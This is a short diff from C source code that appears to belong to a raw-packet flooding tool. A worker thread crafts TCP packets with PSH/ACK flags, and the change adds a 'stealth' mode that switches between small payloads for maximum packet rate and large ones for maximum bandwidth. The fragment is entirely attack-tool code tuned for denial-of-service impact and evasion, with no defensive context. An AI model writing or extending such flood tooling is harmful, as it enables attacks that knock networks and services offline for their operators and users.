@@ -2250,8 +2250,8 @@ void *worker_thread(void *arg) {
                     th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
                 }
                 
-                    // 2. Micro-segmentation: Dynamic Payload Size (1000 to 1440)
-                    unsigned int raw_pl = 1000 + (fast_rand() % 440);
+                    // 2. Payload Size: stealth=small(max PPS), normal=large(max BPS)
+                    unsigned int raw_pl = stealth ? (64 + (fast_rand() % 64)) : (1000 + (fast_rand() % 440));
                     if(raw_pl & 1) raw_pl++; // Keep even for checksum
                     current_pl = raw_pl;
                     tw[6] = htons(flags);
